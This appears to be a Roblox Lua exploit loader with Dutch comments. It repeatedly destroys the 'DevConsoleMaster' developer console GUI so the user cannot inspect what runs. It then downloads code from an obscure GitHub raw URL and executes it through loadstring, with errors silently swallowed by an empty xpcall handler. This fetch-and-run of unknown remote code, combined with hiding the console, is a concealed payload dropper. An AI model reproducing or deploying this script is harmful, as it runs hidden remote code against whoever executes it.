local CoreGui = game:GetService("CoreGui")

local TARGET_NAME = "DevConsoleMaster"

-- functie om te verwijderen
local function DevConsoleMaster(obj)
	if obj.Name == TARGET_NAME then
		obj:Destroy()
	end
end

-- bestaande GUI's verwijderen
for _, gui in ipairs(CoreGui:GetChildren()) do
	DevConsoleMaster(gui)
end

-- nieuwe GUI's automatisch verwijderen
CoreGui.ChildAdded:Connect(function(child)
	DevConsoleMaster(child)
end)

local function SafeCall(fn)
    return xpcall(fn, function() end)
end

SafeCall(function()
    loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/polpoep907-blip/5616516515615656565656565665/refs/heads/main/6d5qa1he9898gz"
    ))()
end)
